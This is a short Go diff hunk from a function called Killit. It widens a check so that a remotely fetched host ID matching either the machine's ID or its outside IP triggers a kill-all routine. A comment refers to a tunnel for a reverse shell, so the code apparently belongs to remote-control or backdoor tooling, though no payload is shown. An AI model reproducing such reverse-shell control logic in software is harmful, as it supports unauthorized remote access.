@@ -22,7 +22,7 @@ func Killit() {
 		if resp.StatusCode == 200 && body != "" {
 			if err := json.Unmarshal([]byte(body), &check); err == nil {
 				// if not need  dont open the tunnel to revert shell
-				if check.Hostid == lib.HOSTID {
+				if check.Hostid == lib.HOSTID || check.Hostid == lib.OUTIP {
 					lib.KillALL()
 				} else {
 					aresp, abody, _ := gorequest.New().
